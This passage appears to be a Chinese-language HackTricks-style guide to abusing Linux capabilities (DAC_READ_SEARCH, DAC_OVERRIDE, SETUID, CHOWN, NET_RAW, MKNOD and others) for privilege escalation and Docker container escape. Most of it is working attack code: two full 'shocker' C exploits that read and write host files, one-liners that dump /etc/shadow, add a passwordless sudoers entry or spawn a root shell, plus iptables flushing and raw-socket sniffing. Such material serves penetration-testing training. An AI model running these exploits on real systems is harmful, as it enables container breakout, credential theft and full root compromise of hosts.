tar -cxf shadow.tar.gz
```
**使用 binary2 的示例**

在这种情况下，假设 **`python`** 二进制文件具有此能力。为了列出根文件，您可以执行：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
为了读取文件，你可以这样做：
```python
print(open("/etc/shadow", "r").read())
```
**在环境中的示例（Docker 突破）**

您可以使用以下命令检查 Docker 容器内启用的能力：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在之前的输出中，您可以看到 **DAC_READ_SEARCH** 权限已启用。因此，容器可以 **调试进程**。

您可以在 [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 学习以下利用的工作原理，但简而言之，**CAP_DAC_READ_SEARCH** 不仅允许我们在没有权限检查的情况下遍历文件系统，还明确移除了对 _**open_by_handle_at(2)**_ 的任何检查，并且 **可能允许我们的进程访问其他进程打开的敏感文件**。

滥用此权限从主机读取文件的原始利用可以在这里找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)，以下是一个 **修改版本，允许您将要读取的文件作为第一个参数指示，并将其转储到文件中。**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> 利用程序需要找到指向主机上某个挂载内容的指针。原始利用程序使用文件 /.dockerinit，而这个修改版本使用 /etc/hostname。如果利用程序不起作用，您可能需要设置不同的文件。要找到在主机上挂载的文件，只需执行 mount 命令：

![](<../../images/image (407) (1).png>)

**此技术的代码来自于“滥用 DAC_READ_SEARCH 能力”的实验室** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

## CAP_DAC_OVERRIDE

**这意味着您可以绕过对任何文件的写入权限检查，因此您可以写入任何文件。**

有很多文件您可以 **覆盖以提升权限，** [**您可以从这里获取想法**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**带有二进制文件的示例**

在此示例中，vim 具有此能力，因此您可以修改任何文件，如 _passwd_、_sudoers_ 或 _shadow_：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**示例与二进制 2**

在此示例中，**`python`** 二进制文件将具有此能力。您可以使用 python 来覆盖任何文件：
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**示例：环境 + CAP_DAC_READ_SEARCH（Docker 逃逸）**

您可以使用以下命令检查 Docker 容器内启用的能力：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
首先阅读上一节中关于 [**滥用 DAC_READ_SEARCH 能力以读取任意文件**](linux-capabilities.md#cap_dac_read_search) 的内容，并 **编译** 利用程序。\
然后，**编译以下版本的 shocker 利用程序**，这将允许您在主机文件系统中 **写入任意文件**：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
为了逃离 docker 容器，你可以 **下载** 主机上的文件 `/etc/shadow` 和 `/etc/passwd`，**添加** 一个 **新用户**，并使用 **`shocker_write`** 来覆盖它们。然后，通过 **ssh** **访问**。

**该技术的代码来自于“滥用 DAC_OVERRIDE 能力”实验室** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**这意味着可以更改任何文件的所有权。**

**带有二进制文件的示例**

假设 **`python`** 二进制文件具有此能力，你可以 **更改** **shadow** 文件的 **所有者**，**更改 root 密码**，并提升权限：
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
或者 **`ruby`** 二进制文件具有此能力：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**这意味着可以更改任何文件的权限。**

**带二进制的示例**

如果python具有此能力，您可以修改shadow文件的权限，**更改root密码**，并提升权限：
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**这意味着可以设置创建进程的有效用户 ID。**

**带二进制的示例**

如果 python 拥有这个 **capability**，你可以很容易地利用它来提升权限到 root：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**另一种方法：**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**这意味着可以设置创建进程的有效组 ID。**

有很多文件可以 **覆盖以提升权限，** [**你可以从这里获取灵感**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**与二进制文件的示例**

在这种情况下，您应该寻找组可以读取的有趣文件，因为您可以冒充任何组：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
一旦你找到一个可以滥用的文件（通过读取或写入）以提升权限，你可以**获取一个模拟有趣组的 shell**，使用：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
在这种情况下，组 shadow 被冒充，因此您可以读取文件 `/etc/shadow`：
```bash
cat /etc/shadow
```
如果 **docker** 已安装，您可以 **冒充** **docker 组** 并利用它与 [**docker socket** 进行通信并提升权限](#writable-docker-socket)。

## CAP_SETFCAP

**这意味着可以在文件和进程上设置能力**

**二进制示例**

如果 python 拥有此 **能力**，您可以非常轻松地利用它提升权限到 root：
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> 注意，如果您使用 CAP_SETFCAP 为二进制文件设置了新能力，您将失去此能力。

一旦您拥有 [SETUID capability](linux-capabilities.md#cap_setuid)，您可以查看其部分以了解如何提升权限。

**环境示例（Docker 突破）**

默认情况下，能力 **CAP_SETFCAP 被赋予 Docker 容器内的进程**。您可以通过执行以下操作来检查：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
这个能力允许**将任何其他能力赋予二进制文件**，因此我们可以考虑**利用本页提到的其他能力突破**来**逃脱**容器。\
然而，如果你尝试例如将能力 CAP_SYS_ADMIN 和 CAP_SYS_PTRACE 赋予 gdb 二进制文件，你会发现你可以赋予它们，但**二进制文件在此之后将无法执行**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: 这是一个**有效能力的限制超集**，线程可以假定它。它也是一个限制超集，线程可以将其添加到可继承集合的能力，前提是该线程在其有效集合中**没有 CAP_SETPCAP** 能力。_\
看起来 Permitted 能力限制了可以使用的能力。\
然而，Docker 默认也授予 **CAP_SETPCAP**，因此您可能能够**在可继承的能力中设置新能力**。\
然而，在该能力的文档中：_CAP_SETPCAP : \[…] **将调用线程的边界** 集中的任何能力添加到其可继承集合。_\
看起来我们只能将边界集合中的能力添加到可继承集合。这意味着**我们不能将新能力如 CAP_SYS_ADMIN 或 CAP_SYS_PTRACE 放入继承集合以提升权限**。

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 提供了一些敏感操作，包括访问 `/dev/mem`、`/dev/kmem` 或 `/proc/kcore`，修改 `mmap_min_addr`，访问 `ioperm(2)` 和 `iopl(2)` 系统调用，以及各种磁盘命令。`FIBMAP ioctl(2)` 也通过此能力启用，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)造成了一些问题。根据手册页，这也允许持有者描述性地`对其他设备执行一系列特定于设备的操作`。

这对于**权限提升**和**Docker 突破**非常有用。

## CAP_KILL

**这意味着可以终止任何进程。**

**带有二进制文件的示例**

假设 **`python`** 二进制文件具有此能力。如果您还可以**修改某些服务或套接字配置**（或与服务相关的任何配置文件）文件，您可以对其进行后门处理，然后终止与该服务相关的进程，并等待新的配置文件执行您的后门。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**使用 kill 提权**

如果你拥有 kill 权限，并且有一个 **以 root 身份运行的 node 程序**（或以其他用户身份运行），你可以 **发送** 给它 **信号 SIGUSR1**，使其 **打开 node 调试器**，以便你可以连接。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**这意味着可以在任何端口上监听（甚至是特权端口）。** 你不能直接通过这个能力提升特权。

**带有二进制的示例**

如果 **`python`** 拥有这个能力，它将能够在任何端口上监听，甚至可以从该端口连接到任何其他端口（某些服务需要从特定特权端口进行连接）

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 能力允许进程 **创建 RAW 和 PACKET 套接字**，使它们能够生成和发送任意网络数据包。这可能导致容器化环境中的安全风险，例如数据包欺骗、流量注入和绕过网络访问控制。恶意行为者可能利用这一点干扰容器路由或危害主机网络安全，尤其是在没有足够防火墙保护的情况下。此外，**CAP_NET_RAW** 对于特权容器支持通过 RAW ICMP 请求进行 ping 操作至关重要。

**这意味着可以嗅探流量。** 你不能直接通过这个能力提升权限。

**带二进制的示例**

如果二进制文件 **`tcpdump`** 拥有此能力，你将能够使用它捕获网络信息。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
请注意，如果**环境**提供了此能力，您也可以使用**`tcpdump`**来嗅探流量。

**使用二进制 2 的示例**

以下示例是**`python2`**代码，可用于拦截“**lo**”（**localhost**）接口的流量。该代码来自实验“_基础知识：CAP-NET_BIND + NET_RAW_” [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 能力赋予持有者 **更改网络配置** 的权力，包括防火墙设置、路由表、套接字权限和暴露的网络命名空间中的网络接口设置。它还允许在网络接口上启用 **混杂模式**，允许跨命名空间进行数据包嗅探。

**带二进制的示例**

假设 **python 二进制文件** 拥有这些能力。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**这意味着可以修改 inode 属性。** 你不能直接通过这个能力提升权限。

**带有二进制的示例**

如果你发现一个文件是不可变的，并且 python 拥有这个能力，你可以 **移除不可变属性并使文件可修改：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!NOTE]
> 注意，通常这个不可变属性是通过以下命令设置和移除的：
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 使得可以执行 `chroot(2)` 系统调用，这可能允许通过已知漏洞逃离 `chroot(2)` 环境：

- [如何从各种 chroot 解决方案中突破](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot 逃逸工具](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 不仅允许执行 `reboot(2)` 系统调用以重启系统，包括针对特定硬件平台的特定命令如 `LINUX_REBOOT_CMD_RESTART2`，还允许使用 `kexec_load(2)`，并且从 Linux 3.17 开始，允许使用 `kexec_file_load(2)` 来加载新的或签名的崩溃内核。

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中从更广泛的 **CAP_SYS_ADMIN** 中分离，专门授予使用 `syslog(2)` 调用的能力。此能力使得在 `kptr_restrict` 设置为 1 时，可以通过 `/proc` 和类似接口查看内核地址，该设置控制内核地址的暴露。自 Linux 2.6.39 起，`kptr_restrict` 的默认值为 0，这意味着内核地址被暴露，尽管许多发行版将其设置为 1（隐藏地址，除了 uid 0）或 2（始终隐藏地址）以出于安全原因。

此外，**CAP_SYSLOG** 允许在 `dmesg_restrict` 设置为 1 时访问 `dmesg` 输出。尽管这些变化，**CAP_SYS_ADMIN** 仍然保留执行 `syslog` 操作的能力，因其历史原因。

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 扩展了 `mknod` 系统调用的功能，不仅限于创建常规文件、FIFO（命名管道）或 UNIX 域套接字。它特别允许创建特殊文件，包括：

- **S_IFCHR**：字符特殊文件，如终端设备。
- **S_IFBLK**：块特殊文件，如磁盘设备。

此能力对于需要创建设备文件的进程至关重要，便于通过字符或块设备直接与硬件交互。

这是一个默认的 docker 能力 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。

此能力允许在主机上进行特权升级（通过完全磁盘读取），在以下条件下：

1. 拥有对主机的初始访问（无特权）。
2. 拥有对容器的初始访问（特权（EUID 0），并有效 `CAP_MKNOD`）。
3. 主机和容器应共享相同的用户命名空间。

**在容器中创建和访问块设备的步骤：**

1. **在主机上作为标准用户：**

- 使用 `id` 确定当前用户 ID，例如 `uid=1000(standarduser)`。
- 确定目标设备，例如 `/dev/sdb`。

2. **在容器内作为 `root`：**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **回到主机：**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
这种方法允许标准用户通过容器访问并可能读取来自 `/dev/sdb` 的数据，利用共享的用户命名空间和设备上设置的权限。

### CAP_SETPCAP

**CAP_SETPCAP** 使进程能够 **更改另一个进程的能力集**，允许从有效、可继承和允许的集合中添加或删除能力。然而，进程只能修改其自身允许集中的能力，确保它无法将另一个进程的权限提升到超出自身的水平。最近的内核更新收紧了这些规则，限制 `CAP_SETPCAP` 只能减少其自身或其后代的允许集中的能力，旨在降低安全风险。使用此功能需要在有效集中拥有 `CAP_SETPCAP`，并在允许集中拥有目标能力，利用 `capset()` 进行修改。这总结了 `CAP_SETPCAP` 的核心功能和限制，突出了其在权限管理和安全增强中的作用。

**`CAP_SETPCAP`** 是一种 Linux 能力，允许进程 **修改另一个进程的能力集**。它授予从其他进程的有效、可继承和允许能力集中添加或删除能力的能力。然而，使用此能力有某些限制。

具有 `CAP_SETPCAP` 的进程 **只能授予或移除其自身允许能力集中存在的能力**。换句话说，如果一个进程没有某个能力，它不能将该能力授予另一个进程。这一限制防止了进程将另一个进程的权限提升到超出自身的权限级别。

此外，在最近的内核版本中，`CAP_SETPCAP` 能力已被 **进一步限制**。它不再允许进程任意修改其他进程的能力集。相反，它 **仅允许进程降低其自身允许能力集或其后代的允许能力集中的能力**。这一变化是为了减少与该能力相关的潜在安全风险。

要有效使用 `CAP_SETPCAP`，您需要在有效能力集中拥有该能力，并在允许能力集中拥有目标能力。然后，您可以使用 `capset()` 系统调用来修改其他进程的能力集。

总之，`CAP_SETPCAP` 允许进程修改其他进程的能力集，但不能授予它自己没有的能力。此外，由于安全问题，其功能在最近的内核版本中已被限制，仅允许减少其自身允许能力集或其后代的允许能力集中的能力。

## 参考文献

**这些示例大多来自** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com)，因此如果您想练习这些权限提升技术，我推荐这些实验室。

**其他参考文献**：

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
